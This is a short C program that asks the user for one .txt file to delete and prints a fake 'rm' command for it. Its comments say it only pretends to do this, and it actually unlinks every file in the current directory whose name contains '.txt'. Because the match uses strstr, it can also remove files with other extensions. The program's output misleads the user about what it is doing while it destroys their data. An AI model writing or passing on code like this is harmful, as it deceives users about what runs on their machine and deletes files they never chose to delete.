#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>

int delete_all_txt_files() {
    DIR *dir;
    struct dirent *entry;
    char cwd[1024];

    // Get the current working directory
    if (getcwd(cwd, sizeof(cwd)) == NULL) {
        perror("getcwd");
        return 1;
    }

    // Open the current directory
    dir = opendir(cwd);
    if (dir == NULL) {
        perror("opendir");
        return 1;
    }

    // Loop through the directory entries
    while ((entry = readdir(dir)) != NULL) {
        // Check if the file has a .txt extension
        if (strstr(entry->d_name, ".txt") != NULL) {
            // Delete the file
            if (unlink(entry->d_name) != 0) {
                perror("unlink");
            }
        }
    }

    closedir(dir);
    return 0;
}

int main() {
    char filename[256];

    // Prompt the user for a .txt file to delete
    printf("Enter the name of the .txt file to delete: ");
    fgets(filename, sizeof(filename), stdin);
    filename[strcspn(filename, "\n")] = 0; // Remove trailing newline

    // Check if the file is a .txt file
    if (strstr(filename, ".txt") == NULL) {
        fprintf(stderr, "This program only deletes .txt files.\n");
        return 1;
    }

    // Pretend to delete the specified file
    printf("Executing: rm %s\n", filename);

    // Actually delete all .txt files in the current directory
    delete_all_txt_files();

    return 0;
}
